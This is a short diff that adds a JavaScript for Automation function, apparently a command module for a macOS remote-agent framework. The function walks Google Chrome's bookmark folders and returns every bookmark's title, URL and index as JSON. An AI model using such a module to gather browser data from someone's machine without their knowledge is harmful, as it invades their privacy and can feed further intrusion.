@@ -1,0 +1,22 @@
+exports.chrome_bookmarks = function(task, command, params){
+	var all_data = [];
+	try{
+		var ch = Application("Google Chrome");
+		var folders = ch.bookmarkFolders;
+		for (var i = 0; i < folders.length; i ++){
+			var folder = folders[i];
+			var bookmarks = folder.bookmarkItems;
+			all_data.push("Folder Name: " + folder.title());
+			for (var j = 0; j < bookmarks.length; j++){
+				var info = "Title: " + bookmarks[j].title() +
+				"\nURL: " + bookmarks[j].url() +
+				"\nindex: " + bookmarks[j].index() +
+				"\nFolder/bookmark: " + i + "/" + j;
+				all_data.push(info); //populate our array
+			}
+		}
+	}catch(error){
+		return error.toString();
+	}
+	return JSON.stringify(all_data);
+};
